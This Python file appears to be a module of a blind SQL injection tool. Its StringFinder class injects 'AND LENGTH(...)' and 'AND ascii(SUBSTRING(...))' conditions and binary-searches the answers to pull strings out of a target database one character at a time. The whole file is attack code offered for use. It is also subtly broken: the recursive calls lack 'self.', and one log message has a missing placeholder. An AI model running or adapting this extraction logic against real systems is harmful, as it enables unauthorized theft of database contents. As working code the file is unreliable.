from tools import *
from tester import Tester

class StringFinder:

    def __init__(self, tester: Tester):
        self.tester = tester

    def search_length(self, sql, a, b):
	    if(a == b):
		    return a
	    if(b - a == 1):
		    if self.tester.test("AND LENGTH({}) = {}".format(sql, b)):
			    return b
		    else :
			    return a
	    pivot = int((a+b)/2)
	    print("[*] pivot : {} / {}-{}".format(pivot,a, b))
	    if self.tester.test("AND LENGTH({}) < {}".format(sql, pivot)):
		    return search_length(sql, a, pivot)
	    else:
	     	return search_length(sql, pivot, b)

    def str_length(self, sql):
	    i = 1
	    while not self.tester.test("AND LENGTH({}) < {}".format(sql, i)):
		    i *= 2
	    print("[*] LENGTH({}) > i".format(sql, i))
	    return search_length(sql, int(i/2), i)

    def search_char(self, sql, i, a, b):
	    if(a == b):
		    return a
	    if(b - a == 1):
		    if self.tester.test("AND ascii(SUBSTRING({}, {},1)) = {}".format(sql, i, b)):
			    return b
		    else :
			    return a
	    pivot = int((a+b)/2)
	    print("[*] pivot : {} / {}-{}".format(pivot,a, b))
	    if self.tester.test("AND ascii(SUBSTRING({}, {},1)) < {}".format(sql, i, pivot)):
		    return search_char(sql, i, a, pivot)
	    else:
	     	return search_char(sql, i,pivot, b)

    def read_string(self, sql):
	    str = ''
	    if self.tester.test("AND LENGTH({})>0".format(sql)):
		    l = str_length(sql)
		    for i in range(1, l+1):
			    str += chr(search_char(sql, i, 20, 127))
			    print("[+] find char, str == {}".format(str))
		    return str
	    else:
		    print("[-] string {} do not exist or is null".format(sql))


